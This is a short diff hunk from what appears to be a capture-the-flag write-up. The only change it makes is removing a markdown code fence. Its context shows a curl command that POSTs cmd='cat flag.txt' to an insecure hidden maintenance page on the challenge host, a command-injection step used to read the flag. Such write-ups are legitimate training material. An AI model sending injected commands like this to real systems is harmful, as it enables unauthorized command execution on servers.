@@ -59,7 +59,6 @@ Lets use `curl` to send a POST request to this insecure page with the parameter 
 
 curl http://challenge.acictf.com:27856/secret_maintenance_foo_543212345 -X POST --form cmd='cat flag.txt'
 
-```
 *...snip...*
 
 <h1>Maintenance</h1>
